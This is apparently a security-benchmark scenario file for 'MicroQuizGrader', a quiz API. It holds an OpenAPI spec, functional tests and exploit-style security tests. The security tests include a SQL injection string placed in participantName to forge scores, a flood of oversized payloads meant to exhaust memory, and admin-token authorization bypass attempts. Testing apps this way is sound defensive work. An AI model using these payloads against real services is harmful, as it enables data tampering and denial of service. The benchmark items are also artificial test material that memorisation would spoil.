# flake8: noqa
# isort: skip_file
import uuid

from exploits import memory_usage

generate_marker = lambda: uuid.uuid4().hex
# import libraries
from typing import Any, Dict, List, Tuple

import requests

import cwes
from scenarios.base import AppInstance


# shared methods
def base_url(app: AppInstance) -> str:
    return f"http://localhost:{app.port}"


def create_quiz(
    app: AppInstance, title: str, questions: List[Dict[str, Any]]
) -> requests.Response:
    url = f"{base_url(app)}/quizzes"
    payload = {"title": title, "questions": questions}
    app.logger.info("POST %s payload=%s", url, payload)
    return requests.post(url=url, json=payload)


def submit_answers(
    app: AppInstance, quiz_id: str, participant_name: str, answers: List[int]
) -> requests.Response:
    url = f"{base_url(app)}/quizzes/{quiz_id}/submissions"
    payload = {"participantName": participant_name, "answers": answers}
    app.logger.info("POST %s payload=%s", url, payload)
    return requests.post(url=url, json=payload)


def get_scores(app: AppInstance, quiz_id: str, admin_token: str) -> requests.Response:
    url = f"{base_url(app)}/quizzes/{quiz_id}/scores"
    headers = {"X-Admin-Token": admin_token}
    app.logger.info("GET %s headers=%s", url, headers)
    return requests.get(url=url, headers=headers)


def is_2xx(status_code: int) -> bool:
    return 200 <= status_code < 300


def safe_json(resp: requests.Response) -> Any:
    try:
        return resp.json()
    except Exception:
        return None


def make_sample_quiz() -> Tuple[str, List[Dict[str, Any]], List[int]]:
    # Returns (title, questions, correct_answers)
    title = "Basics"
    questions = [
        {"prompt": "Q1", "choices": ["A", "B"], "correctIndex": 1},
        {"prompt": "Q2", "choices": ["C", "D", "E"], "correctIndex": 0},
        {"prompt": "Q3", "choices": ["X", "Y"], "correctIndex": 1},
    ]
    correct_answers = [1, 0, 1]
    return title, questions, correct_answers


# import other libraries

# import other libraries
import time
from typing import Any, Dict, List, Tuple


# additional helper code not given already
def build_large_name(
    marker: str, size_bytes: int, suffix_num: int, suffix_width: int = 4
) -> str:
    """
    Construct a large participantName of exactly size_bytes characters.
    The name consists of the marker repeated to fill size_bytes - suffix_width,
    followed by a zero-padded numeric suffix to ensure uniqueness.
    """
    suffix = f"{suffix_num:0{suffix_width}d}"
    prefix_len = max(0, size_bytes - len(suffix))
    # Repeat marker to exceed prefix_len, then slice
    prefix = (marker * ((prefix_len // len(marker)) + 1))[:prefix_len]
    return prefix + suffix


def post_submission_direct(
    app,
    quiz_id: str,
    participant_name: str,
    answers: list[int],
    timeout: tuple[float, float] = (5, 20),
) -> int:
    """
    Post a submission without logging the payload (to avoid leaking the marker).
    Returns HTTP status code or 0 on exception.
    """
    try:
        url = f"{base_url(app)}/quizzes/{quiz_id}/submissions"
        resp = requests.post(
            url=url,
            json={"participantName": participant_name, "answers": answers},
            timeout=timeout,
        )
        return resp.status_code
    except Exception as e:
        app.logger.warning("Submission exception: %s", e)
        return 0


# import other libraries
# additional helper code not given already


# import other libraries
# additional helper code not given already


# import other libraries
# additional helper code not given already


def func_test_create_quiz_returns_ids(app: AppInstance) -> bool:
    title, questions, _ = make_sample_quiz()
    resp = create_quiz(app, title, questions)
    body = safe_json(resp)
    if not is_2xx(resp.status_code):
        app.logger.warning(
            "Create quiz failed: %d %s body=%s", resp.status_code, resp.reason, body
        )
        return False
    if not isinstance(body, dict):
        app.logger.warning("Create quiz response not JSON object: %s", body)
        return False
    quiz_id = body.get("quizId")
    admin_token = body.get("adminToken")
    if not isinstance(quiz_id, str) or not isinstance(admin_token, str):
        app.logger.warning("Expected string quizId and adminToken, got: %s", body)
        return False
    app.logger.info(
        "Quiz created: quizId=%s adminToken(length)=%d", quiz_id, len(admin_token)
    )
    return True


def func_test_quiz_submissions_and_scores_consistency(app: AppInstance) -> bool:
    # 1) Create quiz
    title, questions, correct_answers = make_sample_quiz()
    create_resp = create_quiz(app, title, questions)
    create_body = safe_json(create_resp)
    if not is_2xx(create_resp.status_code) or not isinstance(create_body, dict):
        app.logger.warning(
            "Create quiz failed: %d %s body=%s",
            create_resp.status_code,
            create_resp.reason,
            create_body,
        )
        return False
    quiz_id = create_body.get("quizId")
    admin_token = create_body.get("adminToken")
    if not isinstance(quiz_id, str) or not isinstance(admin_token, str):
        app.logger.warning("Create quiz response missing fields: %s", create_body)
        return False

    # 2) Submit for Alice
    resp_alice = submit_answers(app, quiz_id, "Alice", correct_answers)
    body_alice = safe_json(resp_alice)
    if not is_2xx(resp_alice.status_code) or not isinstance(body_alice, dict):
        app.logger.warning(
            "Alice submission failed: %d %s body=%s",
            resp_alice.status_code,
            resp_alice.reason,
            body_alice,
        )
        return False
    if body_alice.get("participantName") != "Alice":
        app.logger.warning("Alice submission participantName mismatch: %s", body_alice)
        return False
    if not isinstance(body_alice.get("score"), int) or not isinstance(
        body_alice.get("totalQuestions"), int
    ):
        app.logger.warning("Alice submission missing numeric fields: %s", body_alice)
        return False

    # 3) Submit for Bob
    resp_bob = submit_answers(app, quiz_id, "Bob", correct_answers)
    body_bob = safe_json(resp_bob)
    if not is_2xx(resp_bob.status_code) or not isinstance(body_bob, dict):
        app.logger.warning(
            "Bob submission failed: %d %s body=%s",
            resp_bob.status_code,
            resp_bob.reason,
            body_bob,
        )
        return False
    if body_bob.get("participantName") != "Bob":
        app.logger.warning("Bob submission participantName mismatch: %s", body_bob)
        return False
    if not isinstance(body_bob.get("score"), int) or not isinstance(
        body_bob.get("totalQuestions"), int
    ):
        app.logger.warning("Bob submission missing numeric fields: %s", body_bob)
        return False

    # 4) Retrieve scores
    scores_resp = get_scores(app, quiz_id, admin_token)
    scores_body = safe_json(scores_resp)
    if not is_2xx(scores_resp.status_code) or not isinstance(scores_body, list):
        app.logger.warning(
            "Scores retrieval failed: %d %s body=%s",
            scores_resp.status_code,
            scores_resp.reason,
            scores_body,
        )
        return False
    if len(scores_body) != 2:
        app.logger.warning(
            "Expected exactly 2 score entries, got %d: %s",
            len(scores_body),
            scores_body,
        )
        return False

    # Map entries by participantName
    entries = {e.get("participantName"): e for e in scores_body if isinstance(e, dict)}
    for name, submission in [("Alice", body_alice), ("Bob", body_bob)]:
        entry = entries.get(name)
        if not entry:
            app.logger.warning("Missing score entry for %s in %s", name, scores_body)
            return False
        # Validate fields match the submission response
        for field in ["participantName", "score", "totalQuestions"]:
            if entry.get(field) != submission.get(field):
                app.logger.warning(
                    "Mismatch for %s field %s: entry=%s submission=%s",
                    name,
                    field,
                    entry,
                    submission,
                )
                return False

    return True


def func_test_latest_submission_overwrites(app: AppInstance) -> bool:
    # 1) Create quiz
    title, questions, correct_answers = make_sample_quiz()
    create_resp = create_quiz(app, title, questions)
    create_body = safe_json(create_resp)
    if not is_2xx(create_resp.status_code) or not isinstance(create_body, dict):
        app.logger.warning(
            "Create quiz failed: %d %s body=%s",
            create_resp.status_code,
            create_resp.reason,
            create_body,
        )
        return False
    quiz_id = create_body.get("quizId")
    admin_token = create_body.get("adminToken")
    if not isinstance(quiz_id, str) or not isinstance(admin_token, str):
        app.logger.warning("Create quiz response missing fields: %s", create_body)
        return False

    # 2) First submission for Charlie (intentionally different)
    first_resp = submit_answers(app, quiz_id, "Charlie", [0, 0, 0])
    first_body = safe_json(first_resp)
    if not is_2xx(first_resp.status_code) or not isinstance(first_body, dict):
        app.logger.warning(
            "First Charlie submission failed: %d %s body=%s",
            first_resp.status_code,
            first_resp.reason,
            first_body,
        )
        return False

    # 3) Latest submission for Charlie should overwrite
    latest_resp = submit_answers(app, quiz_id, "Charlie", correct_answers)
    latest_body = safe_json(latest_resp)
    if not is_2xx(latest_resp.status_code) or not isinstance(latest_body, dict):
        app.logger.warning(
            "Latest Charlie submission failed: %d %s body=%s",
            latest_resp.status_code,
            latest_resp.reason,
            latest_body,
        )
        return False

    # 4) Retrieve scores; expect exactly one entry for Charlie equal to latest
    scores_resp = get_scores(app, quiz_id, admin_token)
    scores_body = safe_json(scores_resp)
    if not is_2xx(scores_resp.status_code) or not isinstance(scores_body, list):
        app.logger.warning(
            "Scores retrieval failed: %d %s body=%s",
            scores_resp.status_code,
            scores_resp.reason,
            scores_body,
        )
        return False
    if len(scores_body) != 1:
        app.logger.warning(
            "Expected exactly 1 score entry, got %d: %s", len(scores_body), scores_body
        )
        return False
    entry = scores_body[0] if scores_body else None
    if not isinstance(entry, dict):
        app.logger.warning("Score entry is not an object: %s", entry)
        return False
    if entry.get("participantName") != "Charlie":
        app.logger.warning("Expected participantName 'Charlie', got: %s", entry)
        return False
    for field in ["participantName", "score", "totalQuestions"]:
        if entry.get(field) != latest_body.get(field):
            app.logger.warning(
                "Latest overwrite mismatch on field %s: entry=%s latest=%s",
                field,
                entry,
                latest_body,
            )
            return False

    return True


def sec_test_improper_input_validation(app: AppInstance) -> set[cwes.CWE] | None:
    """
    Exploit test for CWE-20: Improper Input Validation (oversized payloads -> DoS).
    Strategy:
      - Create a valid quiz with very large strings (no upper bounds in schema).
      - Submit many unique participants with oversized participantName values.
      - Retrieve scores to force sorting/serialization of large strings.
      - Verify success via marker presence and resource impact (memory delta/response size).
    Returns:
      {cwes.CWE.IMPROPER_INPUT_VALIDATION} on success, otherwise empty set().
    """
    logger = app.logger
    base = f"http://localhost:{app.port}"

    # Sizes to try (progressively smaller fallbacks if server rejects large payloads)
    # Sizes are in bytes
    attempts = [
        # primary attempt (~20+ MiB of scoreboard response)
        dict(
            title=16 * 1024,
            prompt=512 * 1024,
            choice=512 * 1024,
            pname=256 * 1024,
            target_total=20 * 1024 * 1024,
        ),
        # fallback (~10 MiB)
        dict(
            title=8 * 1024,
            prompt=256 * 1024,
            choice=256 * 1024,
            pname=128 * 1024,
            target_total=10 * 1024 * 1024,
        ),
        # fallback (~5 MiB)
        dict(
            title=4 * 1024,
            prompt=128 * 1024,
            choice=128 * 1024,
            pname=64 * 1024,
            target_total=5 * 1024 * 1024,
        ),
    ]

    def make_padded(prefix: str, size: int, pad_char: str = "A") -> str:
        if size <= len(prefix):
            return prefix[:size]
        return prefix + (pad_char * (size - len(prefix)))

    def safe_request(method: str, url: str, **kwargs) -> requests.Response:
        try:
            return requests.request(method=method, url=url, timeout=(5, 60), **kwargs)
        except Exception as e:
            logger.warning("Request %s %s failed: %s", method, url, e)
            r = requests.Response()
            r.status_code = 0
            return r

    marker = generate_marker()  # Do not log/print the marker

    for attempt_idx, sz in enumerate(attempts, start=1):
        title_sz = sz["title"]
        prompt_sz = sz["prompt"]
        choice_sz = sz["choice"]
        pname_sz = sz["pname"]
        target_total = sz["target_total"]

        # Determine a reasonable participant count to reach target_total through name size.
        # Bound the count to keep request volume reasonable.
        participants_count = max(10, min(120, target_total // max(1, pname_sz)))

        logger.info(
            "Attempt %d: sizes(title=%dB, prompt=%dB, choice=%dB, pname=%dB), target_total≈%dB, participants=%d",
            attempt_idx,
            title_sz,
            prompt_sz,
            choice_sz,
            pname_sz,
            target_total,
            participants_count,
        )

        # Build quiz payload with one question and large strings
        title_prefix = "T-"
        title = make_padded(title_prefix, title_sz)

        prompt_prefix = "P-"
        prompt = make_padded(prompt_prefix, prompt_sz)

        choice0_prefix = "C0-"
        choice1_prefix = "C1-"
        choice0 = make_padded(choice0_prefix, choice_sz)
        choice1 = make_padded(choice1_prefix, choice_sz)

        quiz_payload = {
            "title": title,
            "questions": [
                {"prompt": prompt, "choices": [choice0, choice1], "correctIndex": 0}
            ],
        }

        # Baseline memory
        try:
            mem0 = memory_usage(app.container_id)
            logger.info("Baseline memory usage: %d bytes", mem0)
        except Exception as e:
            logger.warning("Failed to read baseline memory usage: %s", e)
            mem0 = None

        # Create quiz (avoid logging payload to keep marker secret)
        create_url = f"{base}/quizzes"
        logger.info(
            "POST %s with oversized fields (payload sizes only, no content)", create_url
        )
        resp_create = safe_request("POST", create_url, json=quiz_payload)

        if resp_create.status_code != 201:
            logger.warning(
                "Quiz creation failed (status=%s). Trying smaller sizes...",
                resp_create.status_code,
            )
            continue

        create_body = None
        try:
            create_body = resp_create.json()
        except Exception:
            pass

        if (
            not isinstance(create_body, dict)
            or "quizId" not in create_body
            or "adminToken" not in create_body
        ):
            logger.warning("Quiz creation response malformed: %s", create_body)
            continue

        quiz_id = create_body["quizId"]
        admin_token = create_body["adminToken"]
        logger.info("Quiz created: quizId=%s (redacted), adminToken received", "***")

        # Submit many oversized participants
        submit_url = f"{base}/quizzes/{quiz_id}/submissions"
        answers = [0]  # one question, correct index 0
        ok_submits = 0

        for i in range(int(participants_count)):
            # Unique, oversized name containing the marker (not logged)
            name_prefix = f"N-{i:04d}-"
            # embed marker but do not log it
            base_name = name_prefix + marker + "-"
            pname = make_padded(base_name, pname_sz, "Z")

            # Build and send without logging payload content
            payload = {"participantName": pname, "answers": answers}
            resp_submit = safe_request("POST", submit_url, json=payload)
            if 200 <= resp_submit.status_code < 300:
                ok_submits += 1
            else:
                logger.warning(
                    "Submission %d failed (status=%s)", i, resp_submit.status_code
                )

            # Small pacing to avoid overwhelming the server
            if i % 10 == 0 and i > 0:
                time.sleep(0.05)

        logger.info(
            "Submissions complete: %d/%d accepted", ok_submits, participants_count
        )
        if ok_submits < max(5, participants_count // 2):
            logger.warning("Too few submissions accepted; trying next attempt size")
            # Clean-up not available; proceed to next attempt
            continue

        # Retrieve scores to force sorting/serialization of large strings
        scores_url = f"{base}/quizzes/{quiz_id}/scores"
        headers = {"X-Admin-Token": admin_token}
        logger.info("GET %s (trigger scoreboard materialization)", scores_url)
        resp_scores = safe_request("GET", scores_url, headers=headers)

        if resp_scores.status_code != 200:
            logger.warning(
                "Scores retrieval failed (status=%s). Trying next attempt size...",
                resp_scores.status_code,
            )
            continue

        # Analyze response without logging content
        response_size = len(resp_scores.content or b"")
        logger.info("Scores response size: %d bytes", response_size)

        body = None
        try:
            body = resp_scores.json()
        except Exception:
            body = None

        if not isinstance(body, list) or len(body) == 0:
            logger.warning(
                "Scores body unexpected: type=%s len=%s",
                type(body),
                (len(body) if hasattr(body, "__len__") else "n/a"),
            )

        # Verify presence of marker in at least one participantName (do not log marker)
        marker_seen = False
        if isinstance(body, list):
            for entry in body[
                : min(len(body), 5)
            ]:  # sample a few to avoid heavy scanning
                try:
                    pn = entry.get("participantName", "")
                    if isinstance(pn, str) and marker in pn:
                        marker_seen = True
                        break
                except Exception:
                    pass

        # Post memory usage
        try:
            mem1 = memory_usage(app.container_id)
            logger.info("Post-action memory usage: %d bytes", mem1)
            mem_delta = mem1 - mem0 if (mem0 is not None and mem1 is not None) else None
        except Exception as e:
            logger.warning("Failed to read post memory usage: %s", e)
            mem_delta = None

        # Heuristic thresholds for success
        # Success if:
        #  - we can retrieve scores; and
        #  - marker is present (oversized data persisted/returned); and
        #  - either response_size is large OR memory usage grew significantly.
        # Compute dynamic thresholds based on attempt sizes/volume.
        expected_min_resp = max(5 * 1024 * 1024, (ok_submits * pname_sz) // 2)
        dynamic_mem_thresh = max(
            8 * 1024 * 1024, (prompt_sz + 2 * choice_sz + ok_submits * (pname_sz // 4))
        )

        large_response = response_size >= expected_min_resp
        significant_mem = (mem_delta is not None) and (mem_delta >= dynamic_mem_thresh)

        logger.info(
            "Verification: marker_seen=%s, large_response=%s (resp=%d >= %d), significant_mem=%s (delta=%s >= %d)",
            marker_seen,
            large_response,
            response_size,
            expected_min_resp,
            significant_mem,
            str(mem_delta),
            dynamic_mem_thresh,
        )

        if marker_seen and (large_response or significant_mem):
            logger.info(
                "CWE-20 Improper Input Validation successfully demonstrated via oversized payload acceptance."
            )
            return {cwes.CWE.IMPROPER_INPUT_VALIDATION}

        # If not successful, try the next (smaller) attempt parameters
        logger.info(
            "Attempt %d did not meet success criteria; trying next attempt size.",
            attempt_idx,
        )

    logger.warning(
        "All attempts failed to demonstrate Improper Input Validation exploit."
    )
    return set()


def sec_test_sql_injection(app: AppInstance) -> set[cwes.CWE] | None:
    """
    Exploit SQL injection in POST /quizzes/{quizId}/submissions via participantName.
    Strategy:
      - Create a quiz and get its admin token.
      - Submit a malicious participantName that breaks out of the VALUES string and injects
        our own answers/score/total, commenting out the rest of the line.
      - Verify via GET /scores (with the legitimate admin token) that the stored score/total
        reflect the injected values (not the graded ones).
    Success: return {cwes.CWE.SQL_INJECTION}
    """
    try:
        # 1) Create a quiz
        title, questions, correct_answers = make_sample_quiz()
        app.logger.info("Creating quiz for SQLi test (submit endpoint)")
        resp_create = create_quiz(app, title, questions)
        if not is_2xx(resp_create.status_code):
            app.logger.warning(
                "Quiz creation failed: status=%s body=%s",
                resp_create.status_code,
                resp_create.text,
            )
            return set()
        cj = safe_json(resp_create) or {}
        quiz_id = cj.get("quizId")
        admin_token = cj.get("adminToken")
        if not quiz_id or not admin_token:
            app.logger.warning("Quiz creation response missing required fields")
            return set()

        # 2) Prepare SQL injection payload for participantName
        # Injected SQL will become:
        # VALUES ('<quiz_id>', '<name_prefix>', '[]', <inj_score>, <inj_total>) -- '<answers_str>', <score>, <total>)
        inj_score = 7777
        inj_total = 8888
        marker = generate_marker()  # do not log
        name_prefix = f"HAX-{marker}"
        injection_name = f"{name_prefix}', '[]', {inj_score}, {inj_total}) -- "

        # 3) Post the malicious submission (answers array must match length to pass pre-checks)
        status = post_submission_direct(
            app, quiz_id, injection_name, list(correct_answers)
        )
        if status != 200:
            app.logger.warning("Injected submission failed: status=%s", status)
            return set()

        # 4) Retrieve scores with the legitimate admin token and verify tampered row
        resp_scores = get_scores(app, quiz_id, admin_token)
        if not is_2xx(resp_scores.status_code):
            app.logger.warning(
                "Failed to retrieve scores with valid token: status=%s",
                resp_scores.status_code,
            )
            return set()

        data = safe_json(resp_scores)
        if not isinstance(data, list):
            app.logger.warning("Scores response not a list")
            return set()

        # Look for our injected participantName with the injected score/total
        found = False
        for entry in data:
            if not isinstance(entry, dict):
                continue
            if (
                entry.get("participantName") == name_prefix
                and entry.get("score") == inj_score
                and entry.get("totalQuestions") == inj_total
            ):
                found = True
                break

        if found:
            app.logger.info(
                "SQL injection successful: tampered score/total via participantName injection"
            )
            return {cwes.CWE.SQL_INJECTION}

        app.logger.warning(
            "Injected row with tampered score/total not found in scoreboard"
        )
        return set()

    except Exception as e:
        app.logger.exception("Exception during SQL injection test: %s", e)
        return set()


def sec_test_incorrect_authorization(app: AppInstance) -> set[cwes.CWE] | None:
    vulns: set[cwes.CWE] = set()
    app.logger.info(
        "Starting security test for CWE-863 Incorrect Authorization (cross-quiz reuse + quizId-as-token bypass)"
    )

    try:
        # Prepare minimal quizzes A and B
        q_min = [{"prompt": "Q1", "choices": ["A", "B"], "correctIndex": 0}]

        # 1) Create Quiz A
        resp_a = create_quiz(app, "Quiz A", q_min)
        app.logger.info("Create Quiz A -> status=%s", resp_a.status_code)
        if resp_a.status_code != 201:
            app.logger.warning("Aborting: failed to create Quiz A")
            return vulns
        data_a = safe_json(resp_a) or {}
        quiz_id_a = data_a.get("quizId")
        token_a = data_a.get("adminToken")
        if not quiz_id_a or not token_a:
            app.logger.warning("Aborting: Quiz A response missing quizId/adminToken")
            return vulns

        # 2) Create Quiz B
        resp_b = create_quiz(app, "Quiz B", q_min)
        app.logger.info("Create Quiz B -> status=%s", resp_b.status_code)
        if resp_b.status_code != 201:
            app.logger.warning("Aborting: failed to create Quiz B")
            return vulns
        data_b = safe_json(resp_b) or {}
        quiz_id_b = data_b.get("quizId")
        token_b = data_b.get("adminToken")
        if not quiz_id_b or not token_b:
            app.logger.warning("Aborting: Quiz B response missing quizId/adminToken")
            return vulns

        # 3) Seed Quiz B with a known score entry using a unique marker (avoid logging marker)
        marker = generate_marker()
        status_sub = post_submission_direct(app, quiz_id_b, marker, [0])
        app.logger.info("Submit to Quiz B -> status=%s", status_sub)
        if status_sub != 200:
            app.logger.warning("Aborting: submission to Quiz B failed")
            return vulns

        # Helper to check if marker exists in score list (avoid logging marker)
        def has_marker(entries: list) -> bool:
            try:
                for e in entries or []:
                    if isinstance(e, dict) and e.get("participantName") == marker:
                        return True
            except Exception:
                return False
            return False

        # 4) Control check: invalid token should be rejected (if not, broader auth failure)
        invalid_token = f"invalid-{uuid.uuid4().hex}"
        resp_invalid = get_scores(app, quiz_id_b, invalid_token)
        app.logger.info(
            "GET scores Quiz B with invalid token -> status=%s",
            resp_invalid.status_code,
        )
        if is_2xx(resp_invalid.status_code):
            body = safe_json(resp_invalid)
            if isinstance(body, list) and has_marker(body):
                app.logger.warning(
                    "VULNERABILITY: Scores readable with an invalid token; marker present in response."
                )
                vulns.add(cwes.CWE.INCORRECT_AUTHORIZATION)
                return vulns
            else:
                app.logger.warning(
                    "Potential broader auth failure: 2xx with invalid token but marker not confirmed."
                )

        # 5) Exploit attempt: use token from Quiz A to read Quiz B scores (cross-quiz token reuse)
        resp_cross = get_scores(app, quiz_id_b, token_a)
        app.logger.info(
            "GET scores Quiz B with token from Quiz A -> status=%s",
            resp_cross.status_code,
        )
        if is_2xx(resp_cross.status_code):
            body = safe_json(resp_cross)
            if isinstance(body, list) and has_marker(body):
                app.logger.warning(
                    "VULNERABILITY: Cross-quiz token reuse succeeded; marker found in Quiz B scores using Quiz A token."
                )
                vulns.add(cwes.CWE.INCORRECT_AUTHORIZATION)
                return vulns

        # 6) Exploit attempt: use the quizId itself as the admin token (bypass observed in implementation)
        resp_idtoken = get_scores(app, quiz_id_b, quiz_id_b)
        app.logger.info(
            "GET scores Quiz B with quizId as token -> status=%s",
            resp_idtoken.status_code,
        )
        if is_2xx(resp_idtoken.status_code):
            body = safe_json(resp_idtoken)
            if isinstance(body, list) and has_marker(body):
                app.logger.warning(
                    "VULNERABILITY CONFIRMED: Quiz scores readable using quizId as token; marker present."
                )
                vulns.add(cwes.CWE.INCORRECT_AUTHORIZATION)
                return vulns

        # 7) Sanity check: ensure normal authorized access works with the correct token
        resp_ok = get_scores(app, quiz_id_b, token_b)
        app.logger.info(
            "GET scores Quiz B with correct token -> status=%s", resp_ok.status_code
        )
        if is_2xx(resp_ok.status_code):
            ok_body = safe_json(resp_ok)
            if isinstance(ok_body, list):
                app.logger.info(
                    "Authorized response contains %d entries; marker present=%s",
                    len(ok_body),
                    str(has_marker(ok_body)),
                )
        else:
            app.logger.warning(
                "Sanity check failed: Could not retrieve scores with correct token."
            )

        # If we reach here without confirming the vulnerability, return empty set
        app.logger.info("Incorrect authorization not observed via tested vectors.")
        return vulns

    except Exception as e:
        app.logger.exception("Exception during security test: %s", e)
        return vulns


_API_SPEC = """
openapi: 3.0.3
info:
  title: MicroQuizGrader
  description: MicroQuizGrader is a backend that lets clients create multiple-choice quizzes, submit answers, and view graded results per quiz.
  version: 1.0.0
paths:
  /quizzes:
    post:
      summary: Create a new multiple-choice quiz
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/QuizCreateRequest'
      responses:
        '201':
          description: Quiz created successfully
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/QuizCreateResponse'
        '400':
          description: Invalid quiz definition
        '422':
          description: Malformed request payload
  /quizzes/{quizId}/submissions:
    post:
      summary: Submit answers for a quiz (latest submission overwrites prior)
      parameters:
        - in: path
          name: quizId
          required: true
          schema:
            type: string
            format: uuid
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/SubmissionRequest'
      responses:
        '200':
          description: Submission graded successfully
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SubmissionResponse'
        '400':
          description: Invalid submission
        '422':
          description: Malformed request payload
        '404':
          description: Quiz not found
  /quizzes/{quizId}/scores:
    get:
      summary: Retrieve the full score list for a quiz (sorted by score, then name)
      parameters:
        - in: path
          name: quizId
          required: true
          schema:
            type: string
            format: uuid
        - in: header
          name: X-Admin-Token
          description: Admin token returned when the quiz was created
          required: true
          schema:
            type: string
      responses:
        '200':
          description: Score list retrieved successfully
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/ScoreEntry'
        '400':
          description: Invalid request
        '422':
          description: Malformed request
        '401':
          description: Missing or invalid admin token
        '404':
          description: Quiz not found
components:
  schemas:
    QuizCreateRequest:
      type: object
      properties:
        title:
          type: string
          minLength: 1
        questions:
          type: array
          minItems: 1
          items:
            $ref: '#/components/schemas/QuestionInput'
      required: [title, questions]
    QuestionInput:
      type: object
      properties:
        prompt:
          type: string
          minLength: 1
        choices:
          type: array
          minItems: 2
          items:
            type: string
            minLength: 1
        correctIndex:
          type: integer
          minimum: 0
          description: 0-based index into the choices array
      required: [prompt, choices, correctIndex]
    QuizCreateResponse:
      type: object
      properties:
        quizId:
          type: string
          format: uuid
        adminToken:
          type: string
      required: [quizId, adminToken]
    SubmissionRequest:
      type: object
      properties:
        participantName:
          type: string
          minLength: 1
        answers:
          type: array
          minItems: 1
          items:
            type: integer
            minimum: 0
      required: [participantName, answers]
    SubmissionResponse:
      type: object
      properties:
        participantName:
          type: string
        score:
          type: integer
          minimum: 0
        totalQuestions:
          type: integer
          minimum: 0
      required: [participantName, score, totalQuestions]
    ScoreEntry:
      type: object
      properties:
        participantName:
          type: string
        score:
          type: integer
          minimum: 0
        totalQuestions:
          type: integer
          minimum: 0
      required: [participantName, score, totalQuestions]
"""

_TEXT_SPEC = """
MicroQuizGrader provides endpoints to create multiple-choice quizzes, accept participant submissions, and retrieve graded results.

1) Create a quiz
- Endpoint: POST /quizzes
- Request body (application/json):
  - title: string (minLength: 1)
  - questions: array (minItems: 1) of:
    - prompt: string (minLength: 1)
    - choices: array (minItems: 2) of non-empty strings
    - correctIndex: integer (minimum: 0), 0-based index into the choices array
- Success response (201, application/json):
  - quizId: string (uuid)
  - adminToken: string
- Error responses:
  - 400 Invalid quiz definition
  - 422 Malformed request payload

2) Submit answers (grades deterministically; latest overwrites prior)
- Endpoint: POST /quizzes/{quizId}/submissions
- Path parameter:
  - quizId: string (uuid)
- Request body (application/json):
  - participantName: string (minLength: 1)
  - answers: array (minItems: 1) of integers (minimum: 0), representing choice indices per question
- Success response (200, application/json):
  - participantName: string
  - score: integer (minimum: 0)
  - totalQuestions: integer (minimum: 0)
- Error responses:
  - 400 Invalid submission
  - 422 Malformed request payload
  - 404 Quiz not found

3) Retrieve full score list (sorted by score, then name)
- Endpoint: GET /quizzes/{quizId}/scores
- Path parameter:
  - quizId: string (uuid)
- Required header:
  - X-Admin-Token: string (admin token returned at creation)
- Success response (200, application/json):
  - Array of entries:
    - participantName: string
    - score: integer (minimum: 0)
    - totalQuestions: integer (minimum: 0)
- Error responses:
  - 400 Invalid request
  - 422 Malformed request
  - 401 Missing or invalid admin token
  - 404 Quiz not found
"""

from scenarios.base import Scenario

SCENARIO = Scenario(
    id="""MicroQuizGrader""",
    api_spec=_API_SPEC,
    text_spec=_TEXT_SPEC,
    short_app_description="""A backend that lets clients create a multiple-choice quiz, submit answers, and view graded results. Endpoints: (1) Create a quiz with a title and a list of questions, each having choices and a correct answer index; returns a quiz ID and an admin token. (2) Submit a participant name and an array of answer indices for a given quiz; the service grades the submission deterministically and stores the participant’s score (latest submission overwrites prior). (3) Retrieve the full score list for a quiz, sorted by score then name; requires providing the admin token returned at creation.""",
    needs_db=True,
    needs_secret=False,
    scenario_instructions="""""",
    functional_tests=[
        func_test_create_quiz_returns_ids,
        func_test_quiz_submissions_and_scores_consistency,
        func_test_latest_submission_overwrites,
    ],
    security_tests=[
        sec_test_improper_input_validation,
        sec_test_sql_injection,
        sec_test_incorrect_authorization,
    ],
)
